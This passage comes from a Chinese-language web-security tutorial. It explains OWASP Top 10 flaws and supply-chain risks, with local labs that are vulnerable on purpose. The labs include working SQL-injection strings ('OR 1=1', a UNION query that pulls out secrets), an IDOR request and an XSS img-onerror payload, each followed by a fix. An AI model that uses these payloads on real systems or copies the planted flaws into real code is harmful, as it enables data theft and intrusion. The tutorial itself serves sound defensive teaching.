+<div class="table-wrap"><table><thead><tr><th>工具</th><th>用途</th><th>你現在需要嗎</th></tr></thead><tbody><tr><td>瀏覽器開發者工具（F12）</td><td>看請求、Cookie、修改頁面</td><td>必學</td></tr><tr><td>curl</td><td>用指令送出任意請求</td><td>必學</td></tr><tr><td>Burp Suite Community</td><td>攔截並修改請求</td><td>做第 4 課練習時學</td></tr><tr><td>OWASP ZAP</td><td>開源的網頁弱點掃描與代理工具</td><td>選學</td></tr><tr><td>nmap</td><td>掃描主機開了哪些服務</td><td>只掃自己的機器，暫時不急</td></tr></tbody></table></div>
+<p>工具本身不違法，<strong>重點是目標有沒有授權</strong>。先用手動方式理解原理，不要直接跳到自動掃描工具。</p>
+<h3 id="實作親手繞過前端限制">實作：親手繞過前端限制</h3>
+<p>這個練習只在你自己的電腦上進行。把以下內容存成 <code>server.py</code>，用 <code>python server.py</code> 啟動。</p>
+<pre><code class="language-python"># 故意不安全的練習程式，只綁定本機，切勿部署
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs
+
+PAGE = &quot;&quot;&quot;&lt;form method=&quot;post&quot;&gt;
+  口數（最多 3 口）：
+  &lt;input name=&quot;qty&quot; type=&quot;number&quot; min=&quot;1&quot; max=&quot;3&quot; value=&quot;1&quot;&gt;
+  &lt;button&gt;送出&lt;/button&gt;
+&lt;/form&gt;&quot;&quot;&quot;
+
+class Handler(BaseHTTPRequestHandler):
+    def respond(self, html):
+        self.send_response(200)
+        self.send_header(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)
+        self.end_headers()
+        self.wfile.write(html.encode(&quot;utf-8&quot;))
+
+    def do_GET(self):
+        self.respond(PAGE)
+
+    def do_POST(self):
+        length = int(self.headers.get(&quot;Content-Length&quot;, 0))
+        body = parse_qs(self.rfile.read(length).decode())
+        qty = body.get(&quot;qty&quot;, [&quot;&quot;])[0]
+        # 漏洞：伺服器沒有檢查 qty
+        self.respond(f&quot;伺服器收到口數：{qty}&quot;)
+
+HTTPServer((&quot;127.0.0.1&quot;, 8000), Handler).serve_forever()</code></pre>
+<ol><li><p>開啟 <code>http://127.0.0.1:8000</code>，輸入 99 並送出。瀏覽器會阻止你。</p>
+</li><li><p>按 F12，在 Elements 面板把 <code>max=&quot;3&quot;</code> 改成 <code>max=&quot;999&quot;</code>，再送出 99。伺服器收下了。</p>
+</li><li><p>另開一個終端機，完全不用網頁，直接送出請求：</p>
+</li></ol>
+<pre><code class="language-bash">curl.exe -X POST -d &quot;qty=99999&quot; http://127.0.0.1:8000</code></pre>
+<ol start="4"><li><p>修補：在 <code>do_POST</code> 的伺服器端加入檢查，只接受 1 到 3 的整數。</p>
+</li></ol>
+<pre><code class="language-python">if not qty.isascii() or not qty.isdigit() or not 1 &lt;= int(qty) &lt;= 3:
+    self.respond(&quot;口數不合法&quot;)
+    return</code></pre>
+<ol start="5"><li><p>重新啟動程式，再次執行第 3 步的 curl，確認已被拒絕。</p>
+</li></ol>
+<p><strong>完成標準：</strong> 你能解釋為什麼第 2、3 步能成功，以及為什麼修補必須寫在伺服器端。</p>
+<h3 id="自我測驗-2">自我測驗</h3>
+<ol><li><p>前端把按鈕隱藏起來，能防止一般使用者呼叫管理員 API 嗎？</p>
+</li><li><p>把 CORS 設定收緊後，是否還需要在 API 檢查權限？</p>
+</li><li><p>為什麼允許清單通常比封鎖清單安全？</p>
+</li></ol>
+<h2 id="第-4-課-網頁漏洞攻防">第 4 課 網頁漏洞攻防</h2>
+<p>這些漏洞名稱很多，但大多可以歸納成兩種錯誤：沒有檢查權限，或把資料當成程式碼執行。學會辨認這兩種模式，比背名詞更有用。</p>
+<h3 id="41-owasp-top-10業界常用的風險清單">4.1 OWASP Top 10：業界常用的風險清單</h3>
+<p><a href="https://top10.owasp.org/2025" target="_blank" rel="noopener">OWASP Top 10:2025</a> 是最常被引用的網頁應用風險清單。它不是完整的檢查標準，但很適合當入門地圖。</p>
+<div class="table-wrap"><table><thead><tr><th>排名</th><th>類別</th><th>白話解釋</th><th>本講義位置</th></tr></thead><tbody><tr><td>A01</td><td>Broken Access Control</td><td>能做或能看不該碰的東西</td><td>4.2</td></tr><tr><td>A02</td><td>Security Misconfiguration</td><td>設定錯誤，例如權限全開</td><td>4.11、第 7 課</td></tr><tr><td>A03</td><td>Software Supply Chain Failures</td><td>依賴的套件或工具出問題</td><td>第 5 課</td></tr><tr><td>A04</td><td>Cryptographic Failures</td><td>加密錯誤或資料沒有保護</td><td>4.10</td></tr><tr><td>A05</td><td>Injection</td><td>資料被當成指令執行</td><td>4.3、4.4、4.7</td></tr><tr><td>A06</td><td>Insecure Design</td><td>設計時就沒考慮濫用情境</td><td>第 1 課</td></tr><tr><td>A07</td><td>Authentication Failures</td><td>登入或身分驗證機制有問題</td><td>第 2 課、4.10</td></tr><tr><td>A08</td><td>Software or Data Integrity Failures</td><td>未驗證更新或資料的完整性</td><td>第 5 課</td></tr><tr><td>A09</td><td>Security Logging and Alerting Failures</td><td>被入侵了也不知道</td><td>第 6 課</td></tr><tr><td>A10</td><td>Mishandling of Exceptional Conditions</td><td>錯誤狀況處理不當</td><td>4.11</td></tr></tbody></table></div>
+<h3 id="42-權限控管失效broken-access-control">4.2 權限控管失效（Broken Access Control）</h3>
+<p>這是 OWASP 2025 排名第一的類別。它的核心很簡單：系統確認了你是誰，卻沒確認你能不能碰這筆資料。</p>
+<p><strong>常見形式：不安全的物件參照（IDOR）</strong></p>
+<pre><code class="language-text">GET /note?id=1   ← 我的筆記
+GET /note?id=2   ← 改個數字，看到別人的筆記</code></pre>
+<div class="table-wrap"><table><thead><tr><th>面向</th><th>內容</th></tr></thead><tbody><tr><td>為什麼會發生</td><td>程式只用 id 查資料，沒有比對資料擁有者</td></tr><tr><td>可能後果</td><td>讀取、修改或刪除他人資料，甚至取得管理權限</td></tr><tr><td>正確防禦</td><td>每個請求都在伺服器端檢查權限，查詢時帶上目前使用者</td></tr><tr><td>無效的做法</td><td>隱藏按鈕、把 id 改成亂數。亂數能增加猜測難度，但不能取代權限檢查</td></tr></tbody></table></div>
+<pre><code class="language-python"># 有漏洞
+row = db.execute(&quot;SELECT * FROM notes WHERE id = ?&quot;, (note_id,)).fetchone()
+
+# 修補：用目前登入者限制查詢範圍
+row = db.execute(
+    &quot;SELECT * FROM notes WHERE id = ? AND owner = ?&quot;, (note_id, current_user)
+).fetchone()</code></pre>
+<p>其中 <code>current_user</code> 必須來自伺服器驗證過的工作階段，不能來自請求參數。</p>
+<p><strong>檢查方式：</strong> 準備兩個測試帳號 A 和 B。用 A 建立資料，再用 B 嘗試讀取、修改和刪除。每個 API 都要測。</p>
+<h3 id="43-sql-注入sql-injection">4.3 SQL 注入（SQL Injection）</h3>
+<p>把使用者輸入直接拼進 SQL，輸入內容就可能變成查詢指令的一部分。</p>
+<pre><code class="language-python"># 有漏洞
+sql = f&quot;SELECT id, title FROM notes WHERE title LIKE &#39;%{q}%&#39;&quot;</code></pre>
+<p>當使用者輸入 <code>x%&#39; OR 1=1 --</code>，查詢會變成：</p>
+<pre><code class="language-sql">SELECT id, title FROM notes WHERE title LIKE &#39;%x%&#39; OR 1=1 --%&#39;</code></pre>
+<p><code>&#39;</code> 結束了原本的字串，<code>OR 1=1</code> 讓條件永遠成立，<code>--</code> 則把後面的內容變成註解。</p>
+<div class="table-wrap"><table><thead><tr><th>面向</th><th>內容</th></tr></thead><tbody><tr><td>可能後果</td><td>讀取整個資料庫、竄改或刪除資料、繞過登入</td></tr><tr><td>正確防禦</td><td>參數化查詢，讓資料庫明確區分指令和資料</td></tr><tr><td>補強措施</td><td>資料庫帳號使用最小權限、限制輸入格式</td></tr><tr><td>無效的做法</td><td>只過濾單引號或 <code>OR</code>。攻擊者常能找到其他寫法</td></tr></tbody></table></div>
+<pre><code class="language-python"># 修補：參數化查詢
+sql = &quot;SELECT id, title FROM notes WHERE title LIKE ?&quot;
+rows = db.execute(sql, (f&quot;%{q}%&quot;,)).fetchall()</code></pre>
+<p>NoSQL、LDAP 和範本引擎也有類似的注入問題。原則相同：不要把資料拼接成指令。</p>
+<h3 id="44-跨站腳本xss">4.4 跨站腳本（XSS）</h3>
+<p>XSS 是資料被瀏覽器當成 JavaScript 執行。惡意腳本會在受害者的登入狀態下運作，能以他的身分發請求，或讀取頁面上的資料。</p>
+<div class="table-wrap"><table><thead><tr><th>類型</th><th>惡意內容在哪裡</th><th>例子</th></tr></thead><tbody><tr><td>儲存型</td><td>存在伺服器，所有檢視者都可能中招</td><td>留言、交易筆記</td></tr><tr><td>反射型</td><td>放在網址等請求內容，由回應帶回</td><td>騙你點一個特製連結</td></tr><tr><td>DOM 型</td><td>前端 JavaScript 自己把資料寫進頁面</td><td><code>innerHTML = location.hash</code></td></tr></tbody></table></div>
+<p>最小的驗證內容如下，只會跳出無害的提示框：</p>
+<pre><code class="language-html">&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
+<p>防禦的重點是<strong>輸出時依情境編碼</strong>：</p>
+<div class="table-wrap"><table><thead><tr><th>資料放在哪裡</th><th>正確做法</th></tr></thead><tbody><tr><td>HTML 內容</td><td>用 <code>textContent</code>，或做 HTML 編碼</td></tr><tr><td>HTML 屬性</td><td>使用框架綁定，或做屬性編碼並加上引號</td></tr><tr><td>JavaScript</td><td>避免直接插入，改用 JSON 或 data 屬性傳遞</td></tr><tr><td>網址</td><td>驗證通訊協定只允許 <code>https:</code>，避免 <code>javascript:</code></td></tr><tr><td>必須顯示 HTML</td><td>使用 DOMPurify 這類成熟函式庫，不要自己寫過濾</td></tr></tbody></table></div>
+<pre><code class="language-javascript">// 有漏洞
+cell.innerHTML = note;
+
+// 修補：文字就當文字處理
+cell.textContent = note;</code></pre>
+<p>補強措施：</p>
+<ul><li><p><strong>內容安全政策（CSP）：</strong> 限制頁面可載入和執行的腳本，是重要的第二道防線。</p>
+</li><li><p><strong>HttpOnly Cookie：</strong> 讓腳本讀不到登入 Cookie，但腳本仍能以受害者身分操作，所以不能取代輸出編碼。</p>
+</li></ul>
+<h3 id="45-跨站請求偽造csrf">4.5 跨站請求偽造（CSRF）</h3>
+<p>CSRF 是騙你的瀏覽器，帶著你的登入狀態，對另一個網站送出你沒打算送的請求。它的成因是瀏覽器會依規則自動帶上 Cookie。</p>
+<figure><svg viewBox="0 0 760 352" role="img" aria-label="CSRF：瀏覽器自動帶上 Cookie，惡意網站就能替你送出請求" font-size="13"><defs><marker id="csrf-arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="var(--muted)"/></marker><marker id="csrf-arrow-accent" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="var(--accent)"/></marker></defs><text x="24" y="30" font-size="15" font-weight="600" fill="var(--ink)">CSRF：瀏覽器自動帶上 Cookie，惡意網站就能替你送出請求</text><g stroke="var(--line)" stroke-width="1.25" stroke-dasharray="4 4"><line x1="120" x2="120" y1="84" y2="328"/><line x1="380" x2="380" y1="84" y2="328"/><line x1="640" x2="640" y1="84" y2="276"/></g><g><rect x="45" y="48" width="150" height="36" rx="8" fill="none" stroke="var(--muted)" stroke-width="1.25"/><text x="120" y="71" text-anchor="middle" font-weight="600" fill="var(--ink)">惡意網站</text></g><g><rect x="305" y="48" width="150" height="36" rx="8" fill="none" stroke="var(--muted)" stroke-width="1.25"/><text x="380" y="71" text-anchor="middle" font-weight="600" fill="var(--ink)">你的瀏覽器</text></g><g><rect x="565" y="48" width="150" height="36" rx="8" fill="none" stroke="var(--muted)" stroke-width="1.25"/><text x="640" y="71" text-anchor="middle" font-weight="600" fill="var(--ink)">你登入的網站</text></g><g><path d="M380 124H640" fill="none" stroke="var(--muted)" stroke-width="1.25" marker-end="url(#csrf-arrow)"/><text x="510" y="114" text-anchor="middle" font-size="11.5" fill="var(--ink)">1. 你先登入，瀏覽器保存 Cookie</text></g><g><path d="M380 170H120" fill="none" stroke="var(--muted)" stroke-width="1.25" marker-end="url(#csrf-arrow)"/><text x="250" y="160" text-anchor="middle" font-size="11.5" fill="var(--ink)">2. 你開啟惡意網頁</text></g><g><path d="M120 216H380" fill="none" stroke="var(--muted)" stroke-width="1.25" marker-end="url(#csrf-arrow)"/><text x="250" y="206" text-anchor="middle" font-size="11.5" fill="var(--ink)">3. 網頁讓瀏覽器送出隱藏表單</text></g><g><path d="M380 262H640" fill="none" stroke="var(--accent)" stroke-width="2" marker-end="url(#csrf-arrow-accent)"/><text x="510" y="252" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--ink)">4. 請求自動帶上你的 Cookie</text></g><g><rect x="520" y="280" width="216" height="48" rx="8" fill="var(--accent)" fill-opacity="0.12" stroke="var(--accent)" stroke-width="2"/><text x="628" y="300" text-anchor="middle" font-size="11.5" font-weight="600" fill="var(--ink)">5. 沒有防護時</text><text x="628" y="318" text-anchor="middle" font-size="11.5" fill="var(--ink)">網站會當成你本人的操作</text></g></svg><figcaption>CSRF 攻擊流程 · 5 個步驟</figcaption></figure>
+<p>防偽權杖會讓第 4 步的請求被拒絕，<code>SameSite</code> 則可以讓瀏覽器在許多跨站情況下不帶上 Cookie。</p>
+<div class="table-wrap"><table><thead><tr><th>面向</th><th>內容</th></tr></thead><tbody><tr><td>能做到</td><td>觸發改資料的操作，例如改設定或刪除資料</td></tr><tr><td>通常做不到</td><td>讀取跨站回應，因為同源政策會限制</td></tr><tr><td>主要防禦</td><td>防偽權杖（Anti-CSRF Token）、<code>SameSite</code> Cookie、檢查 <code>Origin</code> 或 Fetch Metadata 標頭</td></tr><tr><td>基本規則</td><td>不要用 GET 改變狀態</td></tr></tbody></table></div>
+<h3 id="46-伺服器端請求偽造ssrf">4.6 伺服器端請求偽造（SSRF）</h3>
+<p>你的伺服器如果會依使用者提供的網址去抓資料，攻擊者就可能叫它連到內部網路或雲端中繼資料服務。這類請求來自伺服器，因此可能穿過外部防火牆。</p>
+<p>防禦方式：</p>
+<ul><li><p>只允許明確列出的目標網域，不要接受任意網址。</p>
+</li><li><p>拒絕內部 IP、本機位址和雲端中繼資料位址。</p>
+</li><li><p>解析 DNS 後再次檢查 IP，也要限制重新導向。</p>
+</li><li><p>用網路規則限制伺服器能連出的目的地。</p>
+</li></ul>
+<h3 id="47-命令注入與路徑穿越">4.7 命令注入與路徑穿越</h3>
+<p><strong>命令注入：</strong> 把輸入拼進系統指令，輸入就可能變成另一條指令。</p>
+<pre><code class="language-python"># 有漏洞：shell=True 加字串拼接
+subprocess.run(f&quot;convert {filename} out.png&quot;, shell=True)
+
+# 修補：不經 shell，以清單傳遞參數，並先驗證 filename
+subprocess.run([&quot;convert&quot;, filename, &quot;out.png&quot;], check=True)</code></pre>
+<p><strong>路徑穿越：</strong> 使用者用 <code>../</code> 跳出允許的資料夾，讀到其他檔案。</p>
+<pre><code class="language-python">from pathlib import Path
+
+BASE = Path(&quot;uploads&quot;).resolve()
+target = (BASE / user_filename).resolve()
+
+# 修補：解析真實路徑後，確認仍在允許的資料夾內
+if not target.is_relative_to(BASE):
+    raise ValueError(&quot;不合法的路徑&quot;)</code></pre>
+<h3 id="48-檔案上傳">4.8 檔案上傳</h3>
+<p>上傳功能同時涉及多種風險：夾帶可執行檔、用超大檔案耗盡資源，以及用惡意內容攻擊解析程式。</p>
+<ul><li><p>不能只信任副檔名或瀏覽器送來的 <code>Content-Type</code>。</p>
+</li><li><p>限制大小、類型和數量，並實際解析內容。</p>
+</li><li><p>由伺服器產生檔名，不要沿用使用者給的路徑。</p>
+</li><li><p>上傳檔案要存放在網站無法直接執行的位置。</p>
+</li><li><p>CSV 要驗證欄位，寫入試算表前要防公式注入，第 7 課會實作。</p>
+</li></ul>
+<h3 id="49-業務邏輯漏洞">4.9 業務邏輯漏洞</h3>
+<p>程式語法完全正確，流程規則卻可能被濫用，掃描工具也很難發現。測試時可以問：</p>
+<ul><li><p>數量可以是負數、零或極大值嗎？</p>
+</li><li><p>可以跳過步驟，直接呼叫最後一步嗎？</p>
+</li><li><p>同一個請求重送兩次，會寫入兩筆資料嗎？</p>
+</li><li><p>兩個請求同時送出，會發生競爭狀況（Race Condition）嗎？</p>
+</li></ul>
+<h3 id="410-登入密碼儲存與加密">4.10 登入、密碼儲存與加密</h3>
+<p>如果自己實作登入，需要處理的細節很多，能使用成熟服務或框架就不要自己寫。</p>
+<div class="table-wrap"><table><thead><tr><th>主題</th><th>正確做法</th><th>常見錯誤</th></tr></thead><tbody><tr><td>密碼儲存</td><td>Argon2id、scrypt 或 bcrypt</td><td>明文、MD5、SHA-256</td></tr><tr><td>暴力破解</td><td>頻率限制、異常登入通知</td><td>無限次嘗試</td></tr><tr><td>工作階段</td><td>登入後更換識別碼、提供登出與過期機制</td><td>把使用者 id 當登入憑證</td></tr><tr><td>重設密碼</td><td>隨機、短效、一次性的權杖</td><td>可預測的連結</td></tr><tr><td>帳號列舉</td><td>成功與失敗使用一致的訊息</td><td>回應「此 Email 不存在」</td></tr><tr><td>加密</td><td>使用標準函式庫</td><td>自製加密演算法</td></tr><tr><td>隨機值</td><td>用密碼學安全亂數，例如 Python 的 <code>secrets</code></td><td>用 <code>random</code> 產生權杖</td></tr></tbody></table></div>
+<h3 id="411-設定錯誤與例外處理">4.11 設定錯誤與例外處理</h3>
+<p>很多事件不是高深攻擊，而是設定忘了改：</p>
+<ul><li><p>公開的管理頁、除錯模式或預設密碼。</p>
+</li><li><p>雲端檔案或試算表設成「知道連結的人都能存取」。</p>
+</li><li><p>錯誤頁面把堆疊追蹤、路徑或金鑰回傳給使用者。</p>
+</li><li><p>例外發生時反而放行，例如權限檢查出錯時預設允許。</p>
+</li></ul>
+<p>正確做法是對使用者顯示簡短訊息，把詳細錯誤記在伺服器端，並且在出錯時預設拒絕。</p>
+<h3 id="實作在本機攻擊並修補三個漏洞">實作：在本機攻擊並修補三個漏洞</h3>
+<p>這支程式故意包含三個漏洞，只綁定本機，請勿部署或放到網路上。把下方內容存成 <code>lab4.py</code>，用 <code>python lab4.py</code> 啟動。程式只使用 Python 標準函式庫，我已用 Python 3.14 測試過以下攻擊和修補。</p>
+<pre><code class="language-python"># 故意有漏洞的練習程式，只綁定本機，切勿部署
+import html
+import sqlite3
+from http.cookies import SimpleCookie
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import parse_qs, urlparse
+
+db = sqlite3.connect(&quot;:memory:&quot;, check_same_thread=False)
+db.executescript(&quot;&quot;&quot;
+CREATE TABLE notes (id INTEGER PRIMARY KEY, owner TEXT, title TEXT, secret TEXT);
+INSERT INTO notes VALUES
+  (1, &#39;alice&#39;, &#39;Alice 的筆記&#39;, &#39;Alice 的秘密&#39;),
+  (2, &#39;bob&#39;, &#39;Bob 的筆記&#39;, &#39;Bob 的秘密&#39;);
+&quot;&quot;&quot;)
+SESSIONS = {&quot;alice-token&quot;: &quot;alice&quot;, &quot;bob-token&quot;: &quot;bob&quot;}
+comments = []
+
+class Handler(BaseHTTPRequestHandler):
+    def respond(self, text, status=200):
+        self.send_response(status)
+        self.send_header(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)
+        self.end_headers()
+        self.wfile.write(text.encode(&quot;utf-8&quot;))
+
+    def current_user(self):
+        cookie = SimpleCookie(self.headers.get(&quot;Cookie&quot;, &quot;&quot;))
+        token = cookie[&quot;session&quot;].value if &quot;session&quot; in cookie else &quot;&quot;
+        return SESSIONS.get(token)
+
+    def do_GET(self):
+        user = self.current_user()
+        if not user:
+            return self.respond(&quot;請先登入&quot;, 401)
+        url = urlparse(self.path)
+        query = parse_qs(url.query)
+
+        if url.path == &quot;/note&quot;:
+            note_id = query.get(&quot;id&quot;, [&quot;0&quot;])[0]
+            # 漏洞 1（權限控管失效）：沒有檢查這筆資料是不是目前使用者的
+            row = db.execute(
+                &quot;SELECT title, secret FROM notes WHERE id = ?&quot;, (note_id,)
+            ).fetchone()
+            return self.respond(str(row))
+
+        if url.path == &quot;/search&quot;:
+            q = query.get(&quot;q&quot;, [&quot;&quot;])[0]
+            # 漏洞 2（SQL 注入）：把使用者輸入直接拼進 SQL
+            sql = f&quot;SELECT id, title FROM notes WHERE owner = &#39;{user}&#39; AND title LIKE &#39;%{q}%&#39;&quot;
+            try:
+                return self.respond(str(db.execute(sql).fetchall()))
+            except sqlite3.Error:
+                return self.respond(&quot;查詢失敗&quot;, 400)
+
+        if url.path == &quot;/comments&quot;:
+            # 漏洞 3（儲存型 XSS）：把留言原樣放進 HTML
+            items = &quot;&quot;.join(f&quot;&lt;li&gt;{c}&lt;/li&gt;&quot; for c in comments)
+            form = &#39;&lt;form method=&quot;post&quot;&gt;&lt;input name=&quot;c&quot;&gt;&lt;button&gt;留言&lt;/button&gt;&lt;/form&gt;&#39;
+            return self.respond(f&quot;{form}&lt;ul&gt;{items}&lt;/ul&gt;&quot;)
+
+        self.respond(&quot;找不到頁面&quot;, 404)
+
+    def do_POST(self):
+        if not self.current_user():
+            return self.respond(&quot;請先登入&quot;, 401)
+        length = int(self.headers.get(&quot;Content-Length&quot;, 0))
+        body = parse_qs(self.rfile.read(length).decode())
+        comments.append(body.get(&quot;c&quot;, [&quot;&quot;])[0])
+        self.send_response(303)
+        self.send_header(&quot;Location&quot;, &quot;/comments&quot;)
+        self.end_headers()
+
+HTTPServer((&quot;127.0.0.1&quot;, 8001), Handler).serve_forever()</code></pre>
+<p><strong>攻擊 1：讀取別人的資料。</strong> 你以 Alice 的身分登入，卻要求讀取 Bob 的筆記。</p>
+<pre><code class="language-bash">curl.exe -b &quot;session=alice-token&quot; &quot;http://127.0.0.1:8001/note?id=2&quot;</code></pre>
+<p><strong>預期結果：</strong> 看到 <code>Bob 的秘密</code>。</p>
+<p><strong>攻擊 2：SQL 注入。</strong> 先看正常查詢只回傳 Alice 的資料：</p>
+<pre><code class="language-bash">curl.exe -b &quot;session=alice-token&quot; --get --data-urlencode &quot;q=Alice&quot; &quot;http://127.0.0.1:8001/search&quot;</code></pre>
+<p>再用注入繞過擁有者條件：</p>
+<pre><code class="language-bash">curl.exe -b &quot;session=alice-token&quot; --get --data-urlencode &quot;q=x%&#39; OR 1=1 --&quot; &quot;http://127.0.0.1:8001/search&quot;</code></pre>
+<p><strong>預期結果：</strong> Bob 的筆記也出現了。再用 <code>UNION</code> 取出原本沒有顯示的 secret 欄位：</p>
+<pre><code class="language-bash">curl.exe -b &quot;session=alice-token&quot; --get --data-urlencode &quot;q=x%&#39; UNION SELECT id, secret FROM notes --&quot; &quot;http://127.0.0.1:8001/search&quot;</code></pre>
+<p><strong>攻擊 3：儲存型 XSS。</strong> 寫入留言：</p>
+<pre><code class="language-bash">curl.exe -b &quot;session=alice-token&quot; --data-urlencode &quot;c=&lt;img src=x onerror=alert(document.domain)&gt;&quot; &quot;http://127.0.0.1:8001/comments&quot;</code></pre>
+<p>瀏覽器要帶 Cookie 才能看頁面。開啟 <code>http://127.0.0.1:8001/</code> 後按 F12，到 Console 執行 <code>document.cookie = &quot;session=bob-token&quot;</code>，再前往 <code>http://127.0.0.1:8001/comments</code>。</p>
+<p><strong>預期結果：</strong> 提示框跳出。這代表 Alice 寫入的腳本，在 Bob 的瀏覽器裡執行了。</p>
+<p><strong>修補：</strong> 請先自己嘗試，卡住再看以下答案。修改後重新啟動程式，並再跑一次全部攻擊。</p>
+<pre><code class="language-python"># 修補 1：查詢時限制擁有者
+row = db.execute(
+    &quot;SELECT title, secret FROM notes WHERE id = ? AND owner = ?&quot;, (note_id, user)
+).fetchone()
+
+# 修補 2：參數化查詢
+sql = &quot;SELECT id, title FROM notes WHERE owner = ? AND title LIKE ?&quot;
+return self.respond(str(db.execute(sql, (user, f&quot;%{q}%&quot;)).fetchall()))
+
+# 修補 3：輸出時做 HTML 編碼
+items = &quot;&quot;.join(f&quot;&lt;li&gt;{html.escape(c)}&lt;/li&gt;&quot; for c in comments)</code></pre>
+<div class="table-wrap"><table><thead><tr><th>攻擊</th><th>修補前</th><th>修補後</th></tr></thead><tbody><tr><td>讀取 <code>id=2</code></td><td>看到 Bob 的秘密</td><td>回傳 <code>None</code></td></tr><tr><td><code>OR 1=1</code> 注入</td><td>列出所有筆記</td><td>回傳空清單</td></tr><tr><td><code>UNION</code> 注入</td><td>列出所有秘密</td><td>回傳空清單</td></tr><tr><td>XSS 留言</td><td>跳出提示框</td><td>原樣顯示為文字</td></tr></tbody></table></div>
+<p><strong>完成標準：</strong> 全部攻擊都失敗，且你能用自己的話解釋每個修補為什麼有效。</p>
+<h3 id="進階練習">進階練習</h3>
+<p><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a> 免費提供互動練習，可依序做 Access control、SQL injection、XSS、CSRF。<a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener">OWASP Juice Shop</a> 則是一個故意設計成不安全的完整網站，適合綜合練習。Juice Shop 只應在本機或隔離環境執行。</p>
+<h3 id="自我測驗-3">自我測驗</h3>
+<ol><li><p>把資料 id 從流水號改成亂數，算修好 IDOR 了嗎？</p>
+</li><li><p>為什麼參數化查詢比過濾特殊字元可靠？</p>
+</li><li><p>Cookie 設了 HttpOnly，XSS 就沒有危害了嗎？</p>
+</li><li><p>CSRF 攻擊通常能讀到跨站回應的內容嗎？</p>
+</li></ol>
+<h2 id="第-5-課-供應鏈與-ai-風險">第 5 課 供應鏈與 AI 風險</h2>
+<p>你安裝的每個套件、擴充功能和 AI 工具，都可能以你的權限執行程式。所以除了自己寫的程式，也要管好你信任誰、給了多少權限。</p>
+<h3 id="51-供應鏈攻擊怎麼發生">5.1 供應鏈攻擊怎麼發生</h3>
+<div class="table-wrap"><table><thead><tr><th>手法</th><th>怎麼運作</th><th>防禦</th></tr></thead><tbody><tr><td>名稱混淆（Typosquatting）</td><td>取一個和熱門套件很像的名字，等人打錯</td><td>從官方文件複製名稱，安裝前再確認</td></tr><tr><td>幻覺套件（Slopsquatting）</td><td>搶註 AI 常幻想出來的套件名稱</td><td>AI 建議的套件先查證是否真實且有人維護</td></tr><tr><td>維護者帳號被盜</td><td>正常套件被植入惡意更新</td><td>鎖定版本、不盲目自動更新</td></tr><tr><td>相依性混淆（Dependency Confusion）</td><td>公開套件冒用公司內部套件名稱</td><td>指定套件來源與命名空間</td></tr><tr><td>安裝腳本</td><td>套件在安裝時就執行程式</td><td>視情況停用安裝腳本</td></tr><tr><td>惡意 CI 動作或擴充功能</td><td>工具取得 repo 或 Token 權限</td><td>只用可信來源、權限最小化</td></tr></tbody></table></div>
+<p>重點是：<strong>惡意套件可能在安裝時就執行</strong>，不必等你在程式裡呼叫它。</p>
+<h3 id="52-新增套件前的檢查">5.2 新增套件前的檢查</h3>
+<p>先問最重要的問題：<strong>真的需要這個套件嗎？</strong> 幾行程式能解決的事，不值得多一個依賴。</p>
+<ul><li class="task"><label><input type="checkbox" data-task="7"><span>名稱與官方文件完全一致</span></label></li><li class="task"><label><input type="checkbox" data-task="8"><span>原始碼 repo 真實存在，且與套件頁面相符</span></label></li><li class="task"><label><input type="checkbox" data-task="9"><span>維護狀況合理，近期有更新或有明確維護者</span></label></li><li class="task"><label><input type="checkbox" data-task="10"><span>下載量和使用者規模與聲稱的相符</span></label></li><li class="task"><label><input type="checkbox" data-task="11"><span>所要求的權限或安裝腳本合理</span></label></li><li class="task"><label><input type="checkbox" data-task="12"><span>已提交鎖定檔（lockfile）</span></label></li></ul>
+<p>下載量和星星數只能當參考，兩者都可能被灌水，也不能保證下一版沒問題。</p>
+<h3 id="53-日常防護指令">5.3 日常防護指令</h3>
+<div class="table-wrap"><table><thead><tr><th>生態系</th><th>用途</th><th>指令</th></tr></thead><tbody><tr><td>npm</td><td>依鎖定檔安裝</td><td><code>npm ci</code></td></tr><tr><td>npm</td><td>檢查已知漏洞</td><td><code>npm audit</code></td></tr><tr><td>npm</td><td>安裝時不執行腳本</td><td><code>npm ci --ignore-scripts</code></td></tr><tr><td>Python</td><td>檢查已知漏洞</td><td><code>pip-audit</code></td></tr><tr><td>Python</td><td>只接受鎖定檔中雜湊相符的套件</td><td><code>pip install --require-hashes -r requirements.txt</code></td></tr></tbody></table></div>
+<p>部分套件確實需要安裝腳本，所以 <code>--ignore-scripts</code> 可能讓它們無法正常運作。漏洞掃描只能找到已知問題，也擋不住剛發布的惡意版本。</p>
+<p>在 GitHub 上可以再開啟：</p>
+<ul><li><p><strong>Dependabot：</strong> 通知有漏洞的相依套件。</p>
+</li><li><p><strong>Secret Scanning 與 Push Protection：</strong> 偵測並阻止金鑰被推送。</p>
+</li><li><p><strong>分支保護：</strong> 避免直接改動主要分支。</p>
+</li><li><p><strong>GitHub Actions 最小權限：</strong> 把 <code>GITHUB_TOKEN</code> 權限設成唯讀，需要時才開放；第三方 Action 盡量鎖定完整 commit SHA。</p>
+</li></ul>
+<h3 id="54-ai-工具帶來的新風險">5.4 AI 工具帶來的新風險</h3>
+<p>AI 模型無法可靠區分「你的指令」和「它讀到的資料」，這就是提示注入的根本原因。<a href="https://genai.owasp.org/llm-top-10/" target="_blank" rel="noopener">OWASP LLM Top 10</a> 也把它列為第一項風險。</p>
